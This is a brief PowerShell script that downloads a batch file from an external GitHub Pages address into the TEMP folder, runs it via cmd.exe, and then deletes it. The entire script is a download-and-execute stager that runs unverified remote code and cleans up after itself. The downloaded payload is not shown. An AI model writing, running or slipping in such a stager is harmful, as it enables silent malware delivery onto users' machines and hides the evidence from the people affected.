$url = "https://electricboy2023.github.io/scrp/curl.bat"
$destination = Join-Path $env:TEMP "curl.bat"

try {
    Write-Host "[*] Downloading..." -ForegroundColor Cyan

    Invoke-WebRequest -Uri $url -OutFile $destination -ErrorAction Stop

    Write-Host "[+] Downloaded. Executing..." -ForegroundColor Green

    try {
        $process = Start-Process `
            -FilePath "cmd.exe" `
            -ArgumentList "/c `"$destination`"" `
            -Wait `
            -PassThru

        Write-Host "[+] Process exited with code $($process.ExitCode)"
    }
    finally {
        Remove-Item $destination -Force -ErrorAction SilentlyContinue
        Write-Host "[+] Temporary script deleted." -ForegroundColor Green
    }
}
catch {
    Write-Host "[!] Error: $_" -ForegroundColor Red
}
